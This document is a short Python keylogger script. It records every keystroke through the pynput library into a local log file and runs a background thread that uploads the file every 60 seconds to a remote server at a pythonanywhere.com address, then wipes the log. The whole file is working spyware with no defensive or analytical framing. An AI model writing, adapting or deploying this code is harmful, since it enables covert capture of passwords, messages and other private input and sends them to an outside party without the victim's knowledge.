from pynput.keyboard import Listener, Key
import requests
import os
import time
from threading import Thread

# Your server details
SERVER_URL = "https://Dev9496.pythonanywhere.com/upload"  # Update with your PythonAnywhere URL
LOG_FILE = "log.txt"  # Log file to store captured keystrokes

def send_log_file():
    """
    Periodically sends the log file to the server.
    """
    while True:
        # Check if the log file exists and has data
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            try:
                with open(LOG_FILE, 'rb') as f:
                    files = {'file': f}
                    response = requests.post(SERVER_URL, files=files)

                if response.status_code == 200:
                    print(f"Log file sent successfully! Server response: {response.text}")
                    # Clear the log file after successful upload
                    open(LOG_FILE, 'w').close()
                else:
                    print(f"Failed to upload log file. Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending log file: {e}")
        else:
            print("No data to send.")

        # Wait 60 seconds before trying again
        time.sleep(60)

def log_keystroke(key):
    """
    Captures and logs each keystroke.
    """
    keydata = str(key).replace("'", "")  # Remove extra quotes around key names

    # Handle special keys
    if key == Key.backspace:
        keydata = "[BACKSPACE]"
    elif key == Key.space:
        keydata = " "
    elif key == Key.enter:
        keydata = "\n"

    # Write the captured key to the log file
    with open(LOG_FILE, "a") as f:
        f.write(keydata)

# Run the file uploader in a separate thread
uploader_thread = Thread(target=send_log_file, daemon=True)
uploader_thread.start()

# Start the keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()
